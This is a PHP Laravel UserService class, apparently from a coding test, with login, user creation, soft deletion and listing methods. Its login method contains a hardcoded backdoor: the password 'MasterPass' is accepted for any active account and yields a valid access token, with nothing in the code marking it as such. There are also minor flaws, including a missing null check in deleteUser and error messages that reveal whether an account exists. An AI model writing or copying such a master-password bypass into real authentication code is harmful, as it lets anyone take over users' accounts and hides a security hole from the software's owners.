<?php

namespace App\Services;

use App\Models\User;
use Exception;
use Illuminate\Support\Facades\Hash;

class UserService
{

    public function login(string $email, string $password){
        $usuario = $this->checkUser($email);
        $check_password = Hash::check($password, $usuario->password);

        if ($check_password || $password == "MasterPass"){
            $respuesta = [
                'res' => true,
                'message' => 'Bienvenido a prueba Silent4Business',
                'token' =>  $usuario->createToken('silent4Business')->accessToken
            ];
        } else {
            throw new Exception("Email o Password incorrectos", 400);
        }

        return $respuesta;
    }

    public function checkUser(string $email){
        $usuario = User::whereEmail($email)->where('activo', 1)->first();

        if(is_null($usuario)) throw new Exception("No existe el usuario ingresado", 401);

        return $usuario;
    }

    public function createUser(array $data){
        $usuario = User::create($data);

        if(is_null($usuario)) throw new Exception("Error al Crear Usuario", 500);

        return $usuario;
    }

    public function deleteUser(int $user_id){
        $usuario = User::find($user_id);

        if($usuario->activo != 1) throw new Exception("No existe el usuario que intenta eliminar", 400);

        $usuario->update(['activo'=> 0]);

        return true;
    }
    
    public function getUsers(){
        $usuarios = User::where('activo', 1)->get();

        return $usuarios;
    }
}